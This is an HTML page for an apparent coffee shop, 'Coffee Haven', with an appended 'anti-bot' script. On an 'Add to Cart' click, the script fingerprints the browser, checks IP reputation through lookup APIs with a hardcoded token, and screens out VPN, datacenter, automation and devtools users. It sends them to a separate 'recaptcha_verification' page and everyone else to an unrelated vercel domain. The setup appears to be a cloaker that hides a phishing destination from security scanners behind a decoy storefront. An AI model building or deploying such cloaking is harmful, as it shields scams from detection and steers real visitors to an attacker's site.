<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coffee Haven</title>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');

    :root {
      --bg-dark: #1e140b;
      --bg-light: #2c1b0f;
      --accent: #d4a574;
      --accent-hover: #e6b98a;
      --text: #f9efe3;
      --muted: #cbb79b;
      --card-bg: rgba(255, 255, 255, 0.03);
      --transition: all 0.3s ease;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Poppins', sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, var(--bg-dark), var(--bg-light));
      color: var(--text);
      line-height: 1.6;
    }

    /* Hero Section */
    .hero {
      background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.5)), 
                  url('https://images.unsplash.com/photo-1447933601403-0c6688de566e?auto=format&fit=crop&w=1600&q=80');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      height: 50vh;
      min-height: 400px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 1.5rem;
      position: relative;
      overflow: hidden;
    }

    @media (max-width: 768px) {
      .hero {
        height: 40vh;
        min-height: 300px;
        padding: 1rem;
      }
      
      .hero h1 {
        font-size: 2.2rem !important;
        margin-bottom: 0.5rem !important;
      }
      
      .hero p {
        font-size: 1rem !important;
        margin-bottom: 1.5rem !important;
      }
      
      .btn-hero {
        padding: 0.6rem 1.5rem !important;
        font-size: 0.85rem !important;
      }
    }

    .hero-content {
      max-width: 800px;
      animation: fadeInUp 1s ease-out;
    }

    .hero h1 {
      font-size: 3.5rem;
      color: white;
      margin-bottom: 1rem;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
    }

    .hero p {
      font-size: 1.2rem;
      color: white;
      margin-bottom: 2rem;
      max-width: 700px;
      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
    }

    .btn-hero {
      background: var(--accent);
      color: #2c1b0f;
      padding: 0.8rem 2rem;
      border-radius: 30px;
      font-weight: 600;
      text-decoration: none;
      transition: var(--transition);
      display: inline-block;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 0.9rem;
      border: 2px solid var(--accent);
    }

    .btn-hero:hover {
      background: transparent;
      color: var(--accent);
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .container {
      max-width: 1400px;
      margin: 0 auto;
      padding: 0 1.5rem;
    }

    .section-title {
      text-align: center;
      margin: 4rem 0 2rem;
      position: relative;
      padding-bottom: 1rem;
    }

    .section-title h2 {
      font-size: 2.2rem;
      color: var(--accent);
      margin-bottom: 1rem;
    }

    .section-title::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 3px;
      background: var(--accent);
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 1.5rem;
      padding: 1.5rem 0;
      margin: 0 auto;
    }

    @media (max-width: 768px) {
      .grid {
        grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
        gap: 1rem;
        padding: 1rem 0.5rem;
      }
    }

    .card {
      background: var(--card-bg);
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
      overflow: hidden;
      text-align: center;
      transition: var(--transition);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.05);
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    .card:hover {
      transform: translateY(-8px);
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
      border-color: rgba(255, 255, 255, 0.1);
    }

    .card-img-container {
      position: relative;
      width: 100%;
      padding-top: 100%;
      overflow: hidden;
    }

    .card img {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      transition: transform 0.5s ease;
    }

    .card:hover img {
      transform: scale(1.05);
    }

    .card-content {
      padding: 1.25rem;
      display: flex;
      flex-direction: column;
      flex-grow: 1;
    }

    .card h3 {
      margin: 0 0 0.5rem;
      font-size: 1.2rem;
      font-weight: 600;
      color: var(--accent);
    }

    .card p {
      font-size: 1.1rem;
      margin-bottom: 1rem;
      color: var(--muted);
    }

    .price {
      font-weight: 600;
      font-size: 1.1rem;
      margin-bottom: 1rem;
      color: #f5d2a2;
    }

    .btn {
      display: inline-block;
      background: var(--accent);
      color: #2c1b0f;
      padding: 0.6rem 1.2rem;
      border-radius: 25px;
      font-weight: 600;
      text-decoration: none;
      transition: var(--transition);
      font-size: 0.85rem;
      border: none;
      cursor: pointer;
      margin-top: auto;
      width: fit-content;
      margin: 0.5rem auto 0;
    }

    .btn:hover {
      background: var(--accent-hover);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(212, 165, 116, 0.3);
    }

    footer {
      text-align: center;
      padding: 2rem 1rem;
      color: var(--muted);
      font-size: 0.9rem;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      margin-top: 3rem;
    }

    footer a {
      color: var(--accent);
      text-decoration: none;
    }

    footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <!-- Hero Section -->
  <section class="hero">
    <div class="hero-content">
      <h1>Experience the Perfect Brew</h1>
      <p>Discover our handcrafted selection of premium coffee blends, roasted to perfection for your enjoyment. Every cup tells a story of passion and quality.</p>
      <a href="#products" class="btn-hero">Explore Our Menu</a>
    </div>
  </section>

  <!-- Main Content -->
  <main class="container">
    <section id="products">
      <div class="section-title">
        <h2>Our Signature Blends</h2>
        <p>Carefully selected beans from the finest coffee regions</p>
      </div>

      <div class="grid">
        <!-- Card 1 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=800&q=80" alt="Espresso" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Classic Espresso</h3>
            <p>Strong, rich, and full-bodied — a timeless classic for true coffee lovers.</p>
            <div class="price">$3.50</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 2 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1511537190424-bbbab87ac5eb?auto=format&fit=crop&w=800&q=80" alt="Cappuccino" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1511537190424-bbbab87ac5eb?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Velvet Cappuccino</h3>
            <p>Perfectly steamed milk and rich espresso for a creamy indulgence.</p>
            <div class="price">$4.20</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 3 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1517701550927-30cf4ba1dba5?auto=format&fit=crop&w=800&q=80" alt="Latte" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1517701550927-30cf4ba1dba5?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Caramel Latte</h3>
            <p>Sweet caramel notes blended with smooth espresso and steamed milk.</p>
            <div class="price">$4.75</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 4 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1511926652341-e94d0fe92141?auto=format&fit=crop&w=800&q=80" alt="Mocha" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1511926652341-e94d0fe92141?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Chocolate Mocha</h3>
            <p>Espresso meets cocoa — the perfect blend of bold and sweet.</p>
            <div class="price">$5.00</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 5 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=800&q=80" alt="Cold Brew" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Cold Brew</h3>
            <p>Slow-brewed to perfection — smooth, refreshing, and naturally sweet.</p>
            <div class="price">$4.00</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 6 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1495474477477-c87260f955fe?auto=format&fit=crop&w=800&q=80" alt="Macchiato" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1495474477477-c87260f955fe?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Hazelnut Macchiato</h3>
            <p>Nutty, aromatic, and velvety-smooth with a hazelnut twist.</p>
            <div class="price">$4.60</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 7 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1497935586351-b67a49e012bf?auto=format&fit=crop&w=800&q=80" alt="Flat White" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1497935586351-b67a49e012bf?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Flat White</h3>
            <p>Double ristretto with velvety microfoam for a rich coffee experience.</p>
            <div class="price">$4.50</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 8 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1568649929103-28ff82a3e6f5?auto=format&fit=crop&w=800&q=80" alt="Iced Coffee" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1568649929103-28ff82a3e6f5?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Iced Caramel Macchiato</h3>
            <p>Chilled espresso with vanilla, milk, and caramel drizzle over ice.</p>
            <div class="price">$5.25</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 9 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=800&q=80" alt="Turkish Coffee" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Turkish Coffee</h3>
            <p>Finely ground coffee brewed with cardamom and served unfiltered.</p>
            <div class="price">$4.80</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 10 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=800&q=80" alt="Irish Coffee" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Irish Coffee</h3>
            <p>Hot coffee, Irish whiskey, and sugar, topped with cream.</p>
            <div class="price">$6.50</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 11 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1608270586620-248524c67de9?auto=format&fit=crop&w=800&q=80" alt="Cuban Coffee" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1608270586620-248524c67de9?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Cuban Coffee</h3>
            <p>Sweet, strong espresso with demerara sugar whipped into the first drops.</p>
            <div class="price">$4.30</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>

        <!-- Card 12 -->
        <div class="card">
          <div class="card-img-container">
            <img src="https://images.unsplash.com/photo-1506372033494-5d4f2a6b0783?auto=format&fit=crop&w=800&q=80" alt="Affogato" loading="lazy" onerror="this.src='https://images.unsplash.com/photo-1506372033494-5d4f2a6b0783?auto=format&fit=crop&w=400&q=80'" />
          </div>
          <div class="card-content">
            <h3>Affogato</h3>
            <p>Vanilla ice cream "drowned" with a shot of hot espresso.</p>
            <div class="price">$5.50</div>
            <button class="btn">Add to Cart</button>
          </div>
        </div>
      </div>
    </section>
  </main>

  <footer>
    &copy; 2025 Coffee Haven • Crafted with &hearts; by <a href="#">Your Brand</a>
  </footer>

  <!-- paste inside your existing <body> near other scripts or at end of file -->
<script>
/*
  ENHANCED Serious client-side anti-bot + VPN detection
  
  DETECTION METHODS (AGGRESSIVE):
  - User Agent analysis (bots, crawlers, automation tools)
  - WebDriver & automation framework detection (Puppeteer, Playwright, Selenium, Cypress)
  - Headless browser indicators
  - Canvas fingerprinting (detect headless environments)
  - Audio context verification (bots lack proper audio support)
  - WebGL renderer analysis (SwiftShader, LLVMpipe detection)
  - DevTools open detection
  - Hardware & environment signals
  - Behavioral analysis (mouse, keyboard, scroll, touch events)
  - VPN/Proxy/Tor detection via multiple APIs
  - Aggressive datacenter & hosting IP detection (AWS, GCP, Azure, etc.)
  - ASN range analysis for VPN providers
  
  CONFIGURATION:
  - Suspicion threshold: 35 points (LOWERED for stricter detection)
  - Behavioral window: 2.5 seconds
  - VPN check timeout: 3 seconds
  - Fail-safe: on errors/timeouts, allow user to continue
  
  SCORING:
  - Scores range from 0-100
  - Score >= 35 redirects to captcha
  - Score < 35 allows access to main site
*/

(function () {
  // Configuration
  const VPN_APIS = [
    'https://ipapi.co/json/',
    'https://ipwhois.app/json/',
    'https://ipinfo.io/json?token=eca84719e8e75a'
    // add more trusted endpoints if you have API keys (ipinfo, ipdata, etc.)
  ];
  const PER_API_TIMEOUT = 1500; // ms per API request
  const TOTAL_VPN_TIMEOUT = 3000; // overall max time to wait for VPN checks
  const BEHAVIOR_WINDOW = 2500; // ms for measuring human interaction
  const SUSPICION_THRESHOLD = 35; // score above which user is considered suspicious (LOWERED for stricter detection)

  // Utility: fetch with timeout
  function fetchWithTimeout(url, opts = {}, timeout = PER_API_TIMEOUT) {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error('timeout')), timeout);
      fetch(url, Object.assign({ cache: 'no-store', credentials: 'omit' }, opts))
        .then(res => {
          clearTimeout(timer);
          if (!res.ok) return reject(new Error('non-200'));
          return res.json().then(json => resolve(json));
        })
        .catch(err => {
          clearTimeout(timer);
          reject(err);
        });
    });
  }

  // VPN detection: parallel checks, short timeouts, returns boolean and debugging info
  async function detectVPN() {
    const start = Date.now();
    const promises = VPN_APIS.map(api => fetchWithTimeout(api).then(d => ({ ok: true, data: d })).catch(e => ({ ok: false, error: e.message })));
    const results = [];
    // Wait either all settled or TOTAL_VPN_TIMEOUT
    const allSettled = Promise.all(promises.map(p => p.catch(e => e)));
    const timed = Promise.race([allSettled, new Promise(res => setTimeout(() => res(null), TOTAL_VPN_TIMEOUT))]);

    const settled = await timed;
    if (!settled) { // timed out
      return { vpn: false, debug: { timedOut: true, duration: Date.now() - start } };
    }
    // settled is an array of results (or individual rejection values)
    for (let r of settled) {
      if (!r) continue;
      if (r.ok && r.data) {
        results.push(r.data);
      } else if (r && r.error) {
        // collect error if needed
        results.push({ __error: r.error });
      }
    }

    // Analyze results for indicators (MORE AGGRESSIVE)
    let vpnDetected = false;
    const debug = { duration: Date.now() - start, responses: results };

    for (const d of results) {
      if (!d || d.__error) continue;
      const fields = JSON.stringify(d).toLowerCase();

      // Direct VPN/Proxy/Tor indicators
      if (d.vpn === true || d.proxy === true || d.tor === true || d.hosting === true) vpnDetected = true;
      
      // Check multiple fields for VPN keywords
      const vpnKeywords = ['vpn', 'proxy', 'tor', 'relay', 'anonymizer', 'hide', 'private'];
      const suspiciousFields = [d.asn, d.org, d.isp, d.hostname, d.company, d.as, d.org_name].filter(Boolean);
      
      for (const field of suspiciousFields) {
        const fieldLower = String(field).toLowerCase();
        if (vpnKeywords.some(keyword => fieldLower.includes(keyword))) {
          vpnDetected = true;
          break;
        }
      }

      // Aggressive datacenter/hosting detection
      const hostingIndicators = [
        'amazon', 'aws', 'digitalocean', 'ovh', 'linode', 'google cloud', 'gcp', 
        'azure', 'microsoft', 'hetzner', 'vultr', 'rackspace', 'cloudflare',
        'akamai', 'fastly', 'heroku', 'oracle cloud', 'alibaba', 'tencent',
        'datacenter', 'hosting', 'server', 'colocation', 'colo', 'dedicated'
      ];
      
      if (hostingIndicators.some(indicator => fields.includes(indicator))) {
        vpnDetected = true;
      }
      
      // Check for suspicious ASN ranges (common VPN providers)
      if (d.asn) {
        const asn = String(d.asn).toLowerCase();
        const suspiciousASNs = ['as13335', 'as16509', 'as15169', 'as8075', 'as14061', 'as20473'];
        if (suspiciousASNs.some(s => asn.includes(s))) {
          vpnDetected = true;
        }
      }
      
      // Check if connection type suggests business/datacenter
      if (d.connection_type && ['business', 'hosting', 'corporate'].includes(String(d.connection_type).toLowerCase())) {
        vpnDetected = true;
      }
    }

    return { vpn: Boolean(vpnDetected), debug };
  }

  // WebGL vendor/renderer extraction (useful for headless detection)
  function getWebGLInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return null;
      const dbgRenderInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbgRenderInfo) {
        const vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
        return { vendor, renderer };
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  // Canvas fingerprinting detection (bots often have identical canvas output)
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (!ctx) return null;
      
      // Draw text with various styles
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('BotCheck123', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('BotCheck123', 4, 17);
      
      const dataUrl = canvas.toDataURL();
      // Known bot canvas outputs (add more as discovered)
      const knownBotHashes = [
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA', // Common headless Chrome
        // Add more known bot fingerprints
      ];
      
      const isSuspicious = knownBotHashes.some(hash => dataUrl.startsWith(hash));
      return { dataUrl: dataUrl.substring(0, 50), suspicious: isSuspicious };
    } catch (e) {
      return { error: true };
    }
  }

  // Audio context check (bots often lack proper audio support)
  function checkAudioContext() {
    try {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (!AudioContext) return { missing: true };
      
      const context = new AudioContext();
      const oscillator = context.createOscillator();
      const analyser = context.createAnalyser();
      const gainNode = context.createGain();
      const destination = context.destination;
      
      // Check if all components exist
      const hasComponents = !!(oscillator && analyser && gainNode && destination);
      
      // Check sample rate (bots might have unusual values)
      const sampleRate = context.sampleRate;
      const suspiciousSampleRate = sampleRate === 0 || sampleRate > 96000 || sampleRate < 8000;
      
      context.close();
      return { hasComponents, sampleRate, suspicious: suspiciousSampleRate || !hasComponents };
    } catch (e) {
      return { error: true, suspicious: true };
    }
  }

  // DevTools detection
  function isDevToolsOpen() {
    const threshold = 160;
    const widthThreshold = window.outerWidth - window.innerWidth > threshold;
    const heightThreshold = window.outerHeight - window.innerHeight > threshold;
    return widthThreshold || heightThreshold;
  }

  // Check for automation frameworks
  function detectAutomationFrameworks() {
    const indicators = [];
    
    // Puppeteer
    if (window.chrome && window.chrome.runtime && window.chrome.runtime.id) {
      // This is normal for Chrome extensions, but combined with other signals...
    }
    
    // Playwright
    if (window.__playwright || window.__pw_manual) {
      indicators.push('playwright');
    }
    
    // Selenium
    if (window.document.documentElement.getAttribute('webdriver') ||
        window.document.documentElement.getAttribute('selenium') ||
        window.document.documentElement.getAttribute('driver')) {
      indicators.push('selenium-dom');
    }
    
    // Cypress
    if (window.Cypress || window.cy) {
      indicators.push('cypress');
    }
    
    // WebDriver property
    if (Object.getOwnPropertyDescriptor(navigator, 'webdriver')) {
      indicators.push('webdriver-descriptor');
    }
    
    // Check for common automation variables
    const automationVars = ['__webdriver_evaluate', '__selenium_evaluate', '__webdriver_script_function',
                            '__webdriver_script_func', '__webdriver_script_fn', '__fxdriver_evaluate',
                            '__driver_unwrapped', '__webdriver_unwrapped', '__driver_evaluate',
                            '__selenium_unwrapped', '__fxdriver_unwrapped'];
    
    automationVars.forEach(varName => {
      if (window[varName] || document[varName]) {
        indicators.push(varName);
      }
    });
    
    return indicators;
  }

  // Behavioral sampling: short window to see if user moves mouse/presses keys/scrolls
  function observeBehavior(timeout = BEHAVIOR_WINDOW) {
    return new Promise(resolve => {
      const state = { moved: 0, keys: 0, scrolled: 0, touched: 0, start: Date.now() };
      function onMove() { state.moved++; }
      function onKey() { state.keys++; }
      function onScroll() { state.scrolled++; }
      function onTouch() { state.touched++; }

      window.addEventListener('mousemove', onMove, { passive: true });
      window.addEventListener('keydown', onKey, { passive: true });
      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('touchstart', onTouch, { passive: true });

      setTimeout(() => {
        window.removeEventListener('mousemove', onMove);
        window.removeEventListener('keydown', onKey);
        window.removeEventListener('scroll', onScroll);
        window.removeEventListener('touchstart', onTouch);
        resolve(state);
      }, timeout);
    });
  }

  // Score-based bot detection aggregator
  async function computeSuspicionScore() {
    let score = 0;
    const reasons = [];

    // 1) User Agent heuristics (ENHANCED)
    const ua = (navigator.userAgent || '').toLowerCase();
    const botStrings = [
      'bot','googlebot','bingbot','slurp','duckduckbot','baiduspider','yandex','sogou',
      'crawler','spider','robot','headless','phantom','puppeteer','selenium','scrapy','python',
      'playwright','cypress','nightmare','casper','zombie','mechanize','wget','curl',
      'httpclient','java','perl','ruby','go-http','axios','requests'
    ];
    if (botStrings.some(s => ua.includes(s))) {
      score += 70; // INCREASED from 60
      reasons.push('bot-ua');
    }

    // 2) webdriver / headless indicators (ENHANCED)
    if (navigator.webdriver) {
      score += 90; // INCREASED from 80
      reasons.push('navigator.webdriver');
    }
    if (window._phantom || window.__nightmare || window.callPhantom) {
      score += 85; // INCREASED from 70
      reasons.push('phantom-nightmare');
    }
    if (/\bheadlesschrome\b/i.test(ua) || /\bheadless\b/i.test(ua)) {
      score += 65; // INCREASED from 50
      reasons.push('headless-ua');
    }
    
    // NEW: Automation framework detection
    const automationFrameworks = detectAutomationFrameworks();
    if (automationFrameworks.length > 0) {
      score += 80; // HIGH score for detected automation
      reasons.push('automation-framework: ' + automationFrameworks.join(','));
    }

    // 3) Plugins and mimeTypes (bots often have zero plugins)
    try {
      if (navigator.plugins && navigator.plugins.length === 0) {
        score += 20;
        reasons.push('no-plugins');
      }
    } catch (e) { /* ignore */ }

    // 4) Screen resolution checks (very small or zero implies headless)
    try {
      const { width, height } = window.screen || { width: 0, height: 0 };
      if (!width || !height || width < 100 || height < 100) {
        score += 30;
        reasons.push('small-screen');
      }
    } catch (e) { /* ignore */ }

    // 5) Hardware & environment signals
    try {
      if (typeof navigator.hardwareConcurrency === 'number' && navigator.hardwareConcurrency <= 1) {
        score += 8;
        reasons.push('low-hw-concurrency');
      }
      if (!navigator.language || navigator.language.length === 0) {
        score += 10;
        reasons.push('no-language');
      }
    } catch (e) { /* ignore */ }

    // 6) WebGL info (ENHANCED)
    const webgl = getWebGLInfo();
    if (webgl && webgl.vendor) {
      const v = (webgl.vendor || '').toLowerCase();
      const r = (webgl.renderer || '').toLowerCase();
      // Some headless renderers advertise "swiftshader" or "llvmpipe"
      if (v.includes('google') && r.includes('swiftshader')) {
        score += 50; // INCREASED from 40
        reasons.push('swiftshader');
      }
      if (/swiftshader|llvmpipe|software rasterizer|mesa/i.test(v + ' ' + r)) {
        score += 45; // INCREASED from 35
        reasons.push('software-renderer');
      }
    } else {
      // No webgl info could be suspicious in some contexts
      score += 10; // INCREASED from 5
      reasons.push('no-webgl');
    }
    
    // NEW: Canvas fingerprinting check
    const canvas = getCanvasFingerprint();
    if (canvas) {
      if (canvas.error) {
        score += 25;
        reasons.push('canvas-error');
      } else if (canvas.suspicious) {
        score += 60;
        reasons.push('suspicious-canvas-fingerprint');
      }
    }
    
    // NEW: Audio context check
    const audio = checkAudioContext();
    if (audio) {
      if (audio.missing) {
        score += 35;
        reasons.push('no-audio-context');
      } else if (audio.suspicious) {
        score += 45;
        reasons.push('suspicious-audio-context');
      }
    }
    
    // NEW: DevTools detection
    if (isDevToolsOpen()) {
      score += 15;
      reasons.push('devtools-open');
    }

    // 7) Behavioral signals (short window)
    const behavior = await observeBehavior();
    // If no meaningful human interactions in the brief window, raise score
    const humanActions = behavior.moved + behavior.keys + behavior.scrolled + behavior.touched;
    if (humanActions === 0) {
      score += 30;
      reasons.push('no-behavior');
    } else if (humanActions < 3) {
      score += 10;
      reasons.push('low-behavior');
    }

    // 8) VPN / IP checks (parallel, with overall timeout) (ENHANCED)
    let vpnResult = { vpn: false, debug: null };
    try {
      vpnResult = await Promise.race([
        detectVPN(),
        new Promise(resolve => setTimeout(() => resolve({ vpn: false, debug: { timeout: true } }), TOTAL_VPN_TIMEOUT))
      ]);
      if (vpnResult && vpnResult.vpn) {
        score += 90; // INCREASED from 80 - VPN/Proxy is HIGHLY suspicious
        reasons.push('vpn-detected');
      }
    } catch (e) {
      // on errors, do not add score (fail-safe)
      vpnResult = { vpn: false, debug: { error: e.message } };
    }

    // 9) Last-minute UA heuristics: uncommon UA strings (optional small bump)
    if (ua && /mozilla\/5\.0.*chrome\/1(4|3)[^0-9]/i.test(ua) === false) {
      // no-op; left for future tweaks
    }

    // Cap score to 0-100
    if (score > 100) score = 100;
    if (score < 0) score = 0;

    return {
      score,
      reasons,
      vpnDebug: vpnResult.debug || null,
      ua,
      webgl,
      canvas: canvas || null,
      audio: audio || null,
      automationFrameworks: automationFrameworks || [],
      behavior
    };
  }

  // Main handler that runs detection and decides redirection
  async function handleAddToCart(event) {
    event && event.preventDefault && event.preventDefault();
    const button = event && event.target ? event.target : null;
    if (button) {
      button.disabled = true;
      const originalText = button.textContent;
      button.textContent = 'Verifying…';
    }

    let outcome = { suspicious: false, info: null };
    try {
      // Run detection; this will include behavioral window + vpn checks
      const info = await computeSuspicionScore();
      outcome.info = info;

      // Decide suspiciousness by threshold
      if (info.score >= SUSPICION_THRESHOLD) {
        outcome.suspicious = true;
      } else {
        outcome.suspicious = false;
      }

      // Debugging in console (remove for production)
      console.log('AntiBot verdict:', outcome, info);

      if (outcome.suspicious) {
        // Redirect to captcha/verification for human verification
        window.location.href = 'https://captcha-roan-seven.vercel.app/recaptcha_verification.html';
        return;
      } else {
        // Passed checks → go to main site
        window.location.href = 'https://offic-black.vercel.app/';
        return;
      }
    } catch (err) {
      // on unexpected error, fail-safe: let user continue
      console.error('AntiBot error:', err);
      window.location.href = 'https://offic-black.vercel.app/';
      return;
    } finally {
      if (button) {
        // restore button if user didn't get redirected (edge-case)
        try { button.disabled = false; button.textContent = 'Add to Cart'; } catch(e) {}
      }
    }
  }

  // Attach handler to Add to Cart buttons
  document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('.btn').forEach(button => {
      if (button.textContent && button.textContent.trim().toLowerCase() === 'add to cart') {
        button.addEventListener('click', handleAddToCart);
      }
    });
  });

  // Optional: expose for manual testing in console
  window.__antiBot = {
    computeSuspicionScore,
    handleAddToCart
  };
})();
</script>

</body>
</html>